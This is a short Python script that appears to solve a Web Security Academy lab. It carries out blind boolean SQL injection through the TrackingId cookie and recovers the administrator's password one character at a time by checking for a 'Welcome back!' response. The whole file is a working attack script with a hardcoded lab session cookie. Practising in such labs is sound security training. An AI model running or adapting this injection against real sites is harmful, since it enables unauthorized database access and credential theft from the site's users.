

import requests

mass_iH = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

url = 'https://ac9d1fad1eb41471c02522df00ee00de.web-security-academy.net/'
password = ''

for i in range(1,21):
	for x in mass_iH:
		sql_injaction = "+and+(select+substring(password,"+str(i)+",1)+from+users+where+username='administrator')='"+x
		cookie = {'Cookie': 'TrackingId=jsr0C9cawzdaso2R'+sql_injaction+'; session=5BaksIhfVzYeJpDcSsS2niKPJbADu7NS'}
		otvt = requests.get(url,headers=cookie)

		print(otvt, x)

		if otvt.text.find('Welcome back!') != -1:
			print(x)
			password = password+x
			print(password)
			break

